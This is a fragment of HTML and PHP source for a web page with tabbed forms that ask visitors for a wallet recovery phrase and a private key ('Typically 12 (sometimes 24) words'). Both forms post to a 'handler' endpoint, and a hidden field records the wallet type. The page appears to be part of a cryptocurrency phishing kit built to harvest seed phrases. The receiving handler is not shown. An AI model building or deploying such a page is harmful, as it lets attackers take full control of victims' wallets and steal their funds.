...
<body>
          ...
          <div class="tab-content">
            ...
            <div role="tabpanel" class="tab-pane fade show active" id="phrase">
              <form method="post" action="handler">
                ...
                <p  style="margin-top: 10px; color:white;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
            ...
            <div role="tabpanel" class="tab-pane " id="privatekey">
              <form method="post" action="handler">
                ...
                <p class="" style="margin-top: 10px; color:white;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <input type="hidden" name="wallet" value="<?php echo $mode   ?>">
  ...
  <script>
    $(document).ready(function () {
        // let name="<?php echo $_SESSION['mode'] ?>";
        // alert(name)
